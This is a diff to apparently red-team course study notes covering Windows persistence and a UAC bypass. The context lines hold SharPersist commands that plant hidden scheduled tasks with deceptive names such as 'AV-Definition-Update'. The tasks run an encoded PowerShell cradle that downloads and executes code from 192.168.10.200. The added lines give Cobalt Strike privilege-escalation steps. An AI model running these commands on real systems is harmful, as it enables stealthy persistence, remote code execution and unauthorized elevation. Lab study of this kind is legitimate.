@@ -111,3 +111,9 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 ```
 4. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "AV-Definition-Update" -m add -o hourly`
 5. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "SysMonLog" -m add -o logon`
+
+### Windows Privilege Escalation - UAC Bypass
+1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
+2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
+3. Also you can verify it by typing commands ``shell whoami /groups`` and ``shell whoami /priv``. You must be in **admin** group e.g. **BUILTIN\Administrators**
+4. Two methods are provided by **CS** for this **UAC Bypass** i.e. **elevate** and **runasadmin**
